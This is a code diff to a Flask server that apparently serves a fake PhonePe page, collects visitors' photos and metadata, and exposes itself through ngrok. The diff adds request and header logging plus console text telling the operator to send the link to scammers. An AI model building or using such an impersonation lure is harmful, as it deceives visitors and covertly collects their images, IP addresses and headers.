@@ -13,6 +13,7 @@ import threading
 import webbrowser
 import atexit
 import requests
+import logging
 
 # Try to import ngrok
 ngrok = None
@@ -36,6 +37,25 @@ os.makedirs(PHOTOS_DIR, exist_ok=True)
 app = Flask(__name__,
            template_folder='templates',
            static_folder='static')
+
+# Configure basic logging
+logging.basicConfig(
+    level=logging.DEBUG,
+    format='[%(asctime)s] %(levelname)s in %(module)s: %(message)s'
+)
+logger = logging.getLogger(__name__)
+
+
+@app.before_request
+def log_request_info():
+    """Debug log for every incoming request"""
+    logger.info(
+        "Request: %s %s from %s",
+        request.method,
+        request.path,
+        request.remote_addr,
+    )
+    logger.debug("Headers: %s", dict(request.headers))
 
 # Global variables for ngrok
 public_url = None
@@ -218,13 +238,18 @@ def upload_photo():
         photo_data = request.form.get('photo')
         metadata_str = request.form.get('metadata')
 
+        logger.debug("Received upload request. Has photo: %s, raw metadata length: %s",
+                     bool(photo_data), len(metadata_str) if metadata_str else 0)
+
         if not photo_data:
             return jsonify({'error': 'No photo data provided'}), 400
 
         # Parse metadata
         try:
             metadata = json.loads(metadata_str) if metadata_str else {}
+            logger.debug("Parsed metadata: %s", metadata)
         except:
+            logger.warning("Failed to parse metadata JSON. Raw value: %s", metadata_str)
             metadata = {}
 
         # Generate unique capture ID
@@ -252,7 +277,7 @@ def upload_photo():
         })
 
     except Exception as e:
-        print(f"Upload error: {e}")
+        logger.exception("Upload error")
         return jsonify({'error': 'Failed to save photo'}), 500
 
 def start_ngrok():
@@ -265,10 +290,24 @@ def start_ngrok():
 
     try:
         print("🚀 Starting ngrok tunnel...")
+        logger.info("Starting ngrok tunnel on port %s", PORT)
+        # Configure ngrok with request headers including ngrok-skip-browser-warning
         ngrok_process = ngrok.connect(PORT, "http")
         public_url = ngrok_process.public_url
         print(f"✅ Public URL: {public_url}")
-        print("📱 Send this URL to the scammer!")
+        logger.info("Ngrok public URL: %s", public_url)
+        print("=" * 50)
+        print("📱 IMPORTANT: ngrok Free Tier Warning Page")
+        print("=" * 50)
+        print("⚠️  Visitors will see an ngrok warning page ONCE (first visit only)")
+        print("   They must click 'Visit Site' to proceed to your PhonePe interface.")
+        print("")
+        print("💡 To REMOVE the warning page completely:")
+        print("   1. Upgrade to ngrok paid plan ($8/month)")
+        print("   2. Visit: https://dashboard.ngrok.com/billing")
+        print("")
+        print("📤 Send this URL to scammers: " + public_url)
+        print("   (They'll see warning once, then your app)")
         print("=" * 50)
 
         # Open the URL in browser for testing
@@ -276,6 +315,7 @@ def start_ngrok():
 
     except Exception as e:
         print(f"❌ Ngrok error: {e}")
+        logger.exception("Ngrok error")
         print("💡 Make sure you have an ngrok account and auth token set up")
         print("   Run: ngrok config add-authtoken YOUR_TOKEN")
         print("   Or download ngrok manually from https://ngrok.com")
@@ -291,6 +331,7 @@ def cleanup():
         except:
             pass
         print("🧹 Ngrok tunnel closed")
+        logger.info("Ngrok tunnel closed")
 
 def main():
     """Main function to run the server"""
